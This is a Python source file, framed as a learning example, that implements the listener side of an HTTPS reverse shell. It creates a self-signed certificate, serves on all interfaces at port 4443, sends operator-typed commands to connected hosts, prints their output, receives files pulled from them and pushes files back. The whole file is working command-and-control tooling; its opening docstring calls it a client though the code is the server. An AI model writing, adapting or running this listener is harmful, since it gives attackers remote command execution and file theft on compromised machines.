#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""

Sample HTTPS reverse shell client example to learn Python language

MIT License
Copyright (c) 2019, Diogo G. Soares

Permission is hereby granted, free of charge, to any person
obtaining a copy of this software and associated documentation
files (the "Software"), to deal in the Software without
restriction, including without limitation the rights to use,
copy, modify, merge, publish, distribute, sublicense, and/or
sell copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following
conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
"""

import argparse
import ssl
import time
import cgi

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timedelta
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.x509.oid import NameOID
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

__author__ = "dggsoares"
__copyright__ = "Copyright (c) 2019, Diogo G. Soares"
__description__ = 'Simple HTTPS reverse shell server example to learn Python language'
__license__ = "MIT"
__version__ = "1.0"
__maintainer__ = "Diogo G. Soares"
__email__ = "dggsoares at gmail"
__status__ = "Development"
__date__ = 20190411


def create_self_signed_cert(cert_file, key_file):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=4096,
        backend=default_backend()
    )

    # create a self-signed cert
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, 'localhost')
    ])
    now = datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + timedelta(days=10 * 365))
            .public_key(private_key.public_key())
            .sign(private_key, hashes.SHA256(), default_backend())
    )

    with open(cert_file, "wb") as output_cert:
        output_cert.write(cert.public_bytes(encoding=serialization.Encoding.PEM))
    with  open(key_file, "wb") as output_key:
        output_key.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()))


def handle_get(self):
    command = input(f"[#] Shell {self.client_address[0]} > ")
    self.send_response(200)
    self.send_header("Content-type", "text/html")
    self.end_headers()
    self.wfile.write(command.encode())


def handle_post(self):
    # TODO add a Function header with shell command
    if self.headers.get('Function') == 'get_file':
        get_file(self)
    elif self.headers.get('Function') == 'put_file':
        put_file(self)
    else:
        shell_comands(self)


def get_file(self):
    try:
        ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
        if ctype == 'multipart/form-data':
            fs = cgi.FieldStorage(fp=self.rfile,
                                  headers=self.headers,
                                  environ={'REQUEST_METHOD': 'POST'}
                                  )
            fs_upload = fs['file']
            filename = self.headers.get('Filename')
        else:
            print("[X] Unexpected POST request")
            return

        with open(f'/root/Desktop/{filename}', 'wb') as file_output:
            file_output.write(fs_upload.file.read())
            self.send_response(200)
            self.end_headers()
    except Exception as e:
        print(e)

    return


def put_file(self):
    print(self.headers.get('Function'))
    print(self.path)
    with open(self.path, 'rb') as file_upload:
        self.send_response(200)
        self.end_headers()
        self.wfile.write(file_upload.read())


def shell_comands(self):
    self.send_response(200)
    self.end_headers()
    length = int(self.headers['Content-Length'])
    command_output = self.rfile.read(length).decode()
    print(command_output)


class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        handle_get(self)

    def do_POST(self):
        handle_post(self)


def main(args):
    create_self_signed_cert(args.cert, args.pkey)
    httpd = HTTPServer((args.bind, args.port), Server)
    httpd.socket = ssl.wrap_socket(httpd.socket, certfile=args.cert, keyfile=args.pkey)

    try:
        print(f'[+] {time.asctime()} Server is RUNNING! - {args.bind}:{args.port}')
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
        print(f'[x] {time.asctime()} Server is DOWN! - {args.bind}:{args.port}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__description__,
                                     epilog=f'Built by {__author__}. Version {__date__}',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter
                                     )
    parser.add_argument('-b', '--bind', help='IP for bind server', default='0.0.0.0')
    parser.add_argument('-p', '--port', help='Port for bind service', type=int, default=4443)
    parser.add_argument('-c', '--cert', help='Filename of PEM certificate', default='cert.pem')
    parser.add_argument('-k', '--pkey', help='Filename of PEM private key', default='key.pem')
    args = parser.parse_args()
    main(args)
